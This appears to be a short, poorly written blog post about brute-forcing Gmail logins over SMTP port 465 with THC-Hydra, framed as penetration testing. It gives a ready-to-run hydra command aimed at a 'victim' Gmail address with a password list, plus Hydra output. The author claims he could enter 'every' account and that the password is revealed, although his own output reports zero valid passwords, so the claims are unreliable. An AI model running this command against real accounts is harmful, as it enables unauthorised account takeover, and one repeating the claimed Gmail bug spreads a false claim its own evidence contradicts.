Security Research & Studying Lessons.




Brute Force Attacks!

via smtp port 465 - gmail

I'm wundering about every bug, but, no idea, why Google is not fix the Bug. For me as Web Developer was simple to going into my Account. I mean, every Account! But i want to let you know these are Penetration Test and Playing arounf with THC - HYDRA.

i have written a New CommandLine which Brute Force The Gmail Port 465 via. Mac Os X or Linux. Of course you have write a passlist.txt file and but in to your Root of your Mac. - and open Terminal and start hydra.


Hydra Commandline by Lucas Gatsas - for Brute Force Attack on Mac Os X
hydra -S -l victim@gmail.com -P /users/yourmac/passlist.txt -e ns -V -s 465 smtp.gmail.com smtp 



Hydra (http://www.thc.org/thc-hydra) starting at 2015-11-23 04:14:48
[DATA] 3 tasks, 1 server, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking service smtp on port 465
[ATTEMPT] target smtp.gmail.com - login "lucasgatsas@gmail.com" - pass "lucasgatsas@gmail.com" - 1 of 3 [child 0]
[ATTEMPT] target smtp.gmail.com - login "lucasgatsas@gmail.com" - pass "" - 2 of 3 [child 1]
[ATTEMPT] target smtp.gmail.com - login "lucasgatsas@gmail.com" - pass "Cash-/*-?-2014-spacecrash" - 3 of 3 [child 2]
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-11-23 04:14:49
Space-Odysseys-Mac-Pro:~ cyberspace$
as you can see, the e-mail and the password is showing up :

the password is : 
 - pass "Cash-/*-?-2014-spacecrash"
